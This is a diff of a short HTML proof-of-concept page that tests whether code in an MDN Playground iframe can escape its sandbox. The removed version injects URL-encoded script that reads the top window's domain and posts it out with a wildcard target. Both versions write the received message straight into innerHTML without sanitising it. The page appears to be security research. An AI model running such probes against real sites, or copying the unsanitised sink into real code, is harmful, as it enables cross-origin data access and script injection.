@@ -1,19 +1,20 @@
 <!DOCTYPE html>
 <html>
-<head><title>m Sandbox Escape - Real PoC</title></head>
+<head><title>PoC - Sandbox Escape</title></head>
 <body>
-  <h3>PoC: Reading top document domain (sandbox escape)</h3>
+  <h3>Testing sandbox escape</h3>
 
   <iframe
-    src="https://815e6937-0602-4dc4-b396-34fc88f2798c.mdnplay.dev/runner.html?code=try%7Bwindow.parent.postMessage(%22TOP:%20%22%20+%20window.top.document.domain,%22*%22)%7Dcatch(e)%7Bwindow.parent.postMessage(%22ERR:%20%22%20+%20e.message,%22*%22)%7D"
+    src="https://developer.mozilla.org/en-US/play"
     sandbox="allow-scripts allow-same-origin"
     width="800"
-    height="400"
+    height="500"
   ></iframe>
 
   <script>
     window.addEventListener("message", (event) => {
-      document.body.innerHTML += `<p style="color:red;">[Received] ${event.data}</p>`;
+      document.body.innerHTML += `<p style="color:red;">[PoC] Received from iframe: ${event.data}</p>`;
+      console.log("[PoC] Received from iframe:", event.data);
     });
   </script>
 </body>
